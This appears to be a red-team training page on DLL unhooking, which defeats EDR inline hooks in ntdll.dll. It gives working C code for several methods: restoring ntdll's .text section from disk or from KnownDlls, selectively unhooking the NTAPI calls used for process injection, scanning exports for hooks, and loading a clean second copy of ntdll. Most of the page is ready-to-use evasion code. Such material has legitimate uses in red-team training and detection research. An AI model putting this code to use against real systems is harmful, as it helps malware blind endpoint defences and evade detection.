---
layout: training-page
title: "DLL Unhooking — Red Team Academy"
module: "Evasion"
tags:
  - dll-unhooking
  - inline-hooks
  - ntdll
  - edr-bypass
  - unhook
page_key: "evasion-dll-unhooking"
render_with_liquid: false
---

# DLL Unhooking

EDR products inject their DLLs into every process and install inline hooks (usually 5-byte JMP patches) at the beginning of sensitive NTAPI functions in ntdll.dll. When malicious code calls these functions, execution is redirected to the EDR for analysis. Unhooking removes these patches by restoring the original function bytes — either from a clean copy of ntdll loaded from disk, or from KnownDlls.

## How EDR Hooks Work

```
// Original NtAllocateVirtualMemory stub in ntdll:
// 4C 8B D1        mov r10, rcx
// B8 18 00 00 00  mov eax, 0x18
// 0F 05           syscall
// C3              ret

// After EDR hook (inline JMP at start):
// E9 XX XX XX XX  jmp EDR_HOOK  ← 5-byte trampoline to EDR
// 00 00 00        (padding)
// 0F 05           syscall
// C3              ret

// When your code calls NtAllocateVirtualMemory:
// → hits JMP → EDR analyzes call → may block, log, or allow
// → EDR resumes original stub (via trampoline)

// Unhooking: restore original bytes before EDR's JMP
// 4C 8B D1 B8 18 → replaces E9 XX XX XX XX
```

## Overwrite from Disk (Classic Unhooking)

```
// 1. Map a clean copy of ntdll from disk
// 2. Find hooked functions by comparing .text sections
// 3. Copy clean bytes over hooked bytes in memory

#include <windows.h>

void UnhookNtdll() {
    // Get path to ntdll:
    wchar_t ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat_s(ntdllPath, L"\\ntdll.dll");

    // Map clean ntdll from disk:
    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // Get in-memory (hooked) ntdll:
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);

    // Find .text section:
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSection++) {
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            // Unprotect .text:
            DWORD oldProtect;
            VirtualProtect((BYTE*)hNtdll + pSection->VirtualAddress,
                pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            // Copy clean .text from mapped file:
            memcpy((BYTE*)hNtdll + pSection->VirtualAddress,
                (BYTE*)pCleanNtdll + pSection->VirtualAddress,
                pSection->Misc.VirtualSize);

            // Restore protection:
            VirtualProtect((BYTE*)hNtdll + pSection->VirtualAddress,
                pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
```

## KnownDlls Unhooking

```
// \KnownDlls\ntdll.dll is always loaded clean (before EDR hooks)
// Open section object, map into process, copy .text

HANDLE hSection;
UNICODE_STRING sectionName;
RtlInitUnicodeString(&sectionName, L"\\KnownDlls\\ntdll.dll");

OBJECT_ATTRIBUTES objAttr;
InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

// Open the section:
NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_QUERY, &objAttr);

// Map it:
PVOID pClean = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pClean, 0, 0, NULL,
    &viewSize, ViewShare, 0, PAGE_READONLY);

// Use pClean exactly like the disk-mapped approach above
// (copy .text section bytes over hooked ntdll)
```

## Selective Unhooking (Single Function)

```
// Restore only the specific functions you need:
// Avoids bulk unhooking which is more detectable

void UnhookFunction(LPCSTR funcName) {
    // Get hooked address in memory:
    PVOID pHooked = GetProcAddress(GetModuleHandleA("ntdll"), funcName);

    // Get clean address from disk-mapped ntdll:
    // (Map ntdll from disk as above, find export by name)
    PVOID pClean = GetExportFromMappedNtdll(pCleanMapping, funcName);

    // First 8 bytes are typically the full syscall stub:
    DWORD oldProtect;
    VirtualProtect(pHooked, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pHooked, pClean, 8);
    VirtualProtect(pHooked, 8, oldProtect, &oldProtect);
}

// Usage:
UnhookFunction("NtAllocateVirtualMemory");
UnhookFunction("NtWriteVirtualMemory");
UnhookFunction("NtCreateThreadEx");
UnhookFunction("NtOpenProcess");
```

## Detecting Hooks Before Unhooking

```
// Scan ntdll exports for hooks (JMP byte 0xE9 or INT3 0xCC at start):
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
    (BYTE*)hNtdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

PDWORD nameRVAs = (PDWORD)((BYTE*)hNtdll + exp->AddressOfNames);
PDWORD funcRVAs = (PDWORD)((BYTE*)hNtdll + exp->AddressOfFunctions);
PWORD ordinals = (PWORD)((BYTE*)hNtdll + exp->AddressOfNameOrdinals);

for (DWORD i = 0; i < exp->NumberOfNames; i++) {
    LPCSTR name = (LPCSTR)((BYTE*)hNtdll + nameRVAs[i]);
    PVOID func = (BYTE*)hNtdll + funcRVAs[ordinals[i]];
    BYTE firstByte = *(BYTE*)func;
    if (firstByte == 0xE9 || firstByte == 0xCC) {
        printf("[HOOKED] %s @ %p\n", name, func);
    }
}
```

## Alternative: Load Ntdll Twice

```
// Load a second copy of ntdll with a different name to avoid hooks:
// EDR only hooks the first loaded instance

// LdrLoadDll with custom path mapping → load ntdll as "ntdll2.dll"
// Resolve function pointers from clean copy
// Call functions directly via pointers (no hooks)

// Or: Manual PE mapping — parse ntdll.dll from disk without LoadLibrary
// EDR load callbacks won't fire for manually mapped PE
// Get function addresses by parsing export table yourself
```

## Resources

- Red Canary — EDR hook detection and bypass
- outflanknl/TartarusGate — combines unhooking + syscalls
- Sektor7 — PE injection and unhooking course
- ired.team — `www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll`
- MDSec — DLL unhooking in process injection context
- winsyscall/peloader — manual PE mapping reference
